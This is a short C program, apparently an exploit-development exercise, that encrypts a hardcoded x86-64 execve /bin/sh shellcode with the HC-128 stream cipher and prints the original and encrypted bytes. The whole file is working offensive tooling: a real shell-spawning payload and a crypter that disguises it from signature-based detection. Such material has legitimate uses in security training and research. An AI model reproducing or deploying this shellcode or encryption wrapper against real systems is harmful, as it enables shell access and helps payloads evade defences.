// File: encrypt2hc-128.c
// Author: Petr Javorik

#include <string.h>
#include <stdio.h>
#include "hc128_p3source/hc-128.c"

// execve stack /bin/sh
unsigned char code[] = \
"\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05";

// Encryption key must be exactly 16 bytes
char key[16] = {'s', 'o', 'm', 'e', 'e', 'n', 'c', 'r', 'y', 'p', 't', 'k', 'e', 'y', 'y', 'y'};

// IV must be exactly 16 bytes
char iv[16] = {'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p'};


int main()
{
	// Initialize ECRYPT library
    ECRYPT_init();
    // ctx is object containing settings and state of encryption engine
    ECRYPT_ctx ctx;
	// Load key
    ECRYPT_keysetup(&ctx, key, 128, 128);
	// Load IV
	ECRYPT_ivsetup(&ctx, iv);
	// Encrypt
	u8 encrypted[200];
	int codeLen = strlen(code);
	ECRYPT_encrypt_bytes(&ctx, code, encrypted, codeLen);

	// Print result
    int i;
    printf("Encryption Key = ");
    for (i=0; i<16; i++)
        printf("%c", key[i]);
    printf("\n");

	printf("IV = ");
    for (i=0; i<16; i++)
        printf("%c", iv[i]);
    printf("\n");

    printf("Original       = ");
    for (i=0; i<codeLen; i++)
        printf("\\x%02x", code[i]);
    printf("\n");

    printf("Encrypted      = ");
    for (i=0; i<codeLen; i++)
        printf("\\x%02x", encrypted[i]);
    printf ("\n");

    return 0;
}
